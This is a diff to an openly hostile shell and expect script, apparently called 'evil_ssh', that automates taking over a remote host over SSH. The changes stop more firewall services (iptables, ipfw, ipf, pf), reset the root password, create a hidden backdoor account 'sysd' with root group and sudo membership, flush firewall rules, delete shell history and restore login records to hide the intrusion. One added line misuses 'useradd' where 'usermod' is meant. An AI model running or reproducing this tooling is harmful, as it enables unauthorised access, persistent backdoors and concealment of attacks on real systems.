@@ -15,7 +15,7 @@ fi
 #variables - can be changed to meet different needs
 expectFile="connect.exp"
 errorFile=".evil_ssh.log"
-serviceStop="iptables"
+serviceStop="iptables ipfw ipf pf"
 serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs nfslock rpcbind rpcidmapd smb smbd samba rsync rsh rlogin ftp"
 doServices="yes"
 newUser="sysd"
@@ -24,7 +24,7 @@ newPass="Password!"
 dropTables="no"
 defaceSite="no"
 shareRoot="no"
-alterLastHistory="yes"
+alterLastHistory="no"
 
 if [ $# -gt 0 ]; then
 	firstArg=`echo $1 | /usr/bin/env awk -F":" '{print $1}'`
@@ -86,11 +86,17 @@ fi
 interact -o -nobuffer -re \$prompt return
 send "history -d \`history | wc -l\`; /bin/sh\r"
 interact -o -nobuffer -re \$prompt return
-send "echo -e \"$newRootPass\n$newRootPass\" | passwd\r"
+send "echo -e \"$newRootPass\\n$newRootPass\" | passwd\r"
 interact -o -nobuffer -re \$prompt return
-send "useradd -g root -G sudo -o -u 250 $newUser\r"
+send "useradd -g root -M -o -u 250 $newUser\r"
 interact -o -nobuffer -re \$prompt return
-send "echo -e \"$newPass\n$newPass\" | passwd\r"
+send "usermod -a -G sudo $newUser\r"
+interact -o -nobuffer -re \$prompt return
+send "useradd -a -G adm $newUser\r"
+interact -o -nobuffer -re \$prompt return
+send "pwck -s\r"
+interact -o -nobuffer -re \$prompt return
+send "echo -e \"$newPass\\n$newPass\" | passwd\r"
 interact -o -nobuffer -re \$prompt return
 send "/usr/bin/env iptables -F || ipfw flush\r"
 MORE
@@ -127,7 +133,7 @@ fi
 
 if [ "$alterLastHistory" == "yes" ]; then
 	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
-	echo "send \"mv /var/log/wtmp.bak /var/log/wtmp\"" >> $expectFile
+	echo "send \"mv /var/log/wtmp.bak /var/log/wtmp\r\"" >> $expectFile
 fi
 
 /bin/cat <<BOTTOM >> $expectFile
